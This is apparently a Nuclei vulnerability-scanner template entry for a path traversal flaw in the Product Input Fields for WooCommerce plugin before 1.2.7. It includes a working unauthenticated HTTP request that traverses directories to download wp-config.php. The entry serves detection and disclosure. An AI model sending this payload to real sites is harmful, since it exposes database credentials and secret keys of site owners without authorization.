# Nuclei Template: Product Input Fields for WooCommerce < 1.2.7 - Unauthenticated File Download
**Template ID:** wp-woocommerce-file-download
**Vulnerability Class:** Path Traversal
**Severity:** High
**CWE:** CWE-22
**Source:** Nuclei Template (`wp-woocommerce-file-download.yaml`)

## Vulnerability Information & PoC

## Description
WordPress WooCommerce < 1.2.7 is susceptible to file download vulnerabilities. The lack of authorization checks in the handle_downloads() function hooked to admin_init() could allow unauthenticated users to download arbitrary files from the blog using a path traversal payload.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-admin/admin-post.php?alg_wc_pif_download_file=../../../../../wp-config.php
```

## References
- https://wpscan.com/vulnerability/15f345e6-fc53-4bac-bc5a-de898181ea74
- https://blog.nintechnet.com/high-severity-vulnerability-fixed-in-product-input-fields-for-woocommerce/
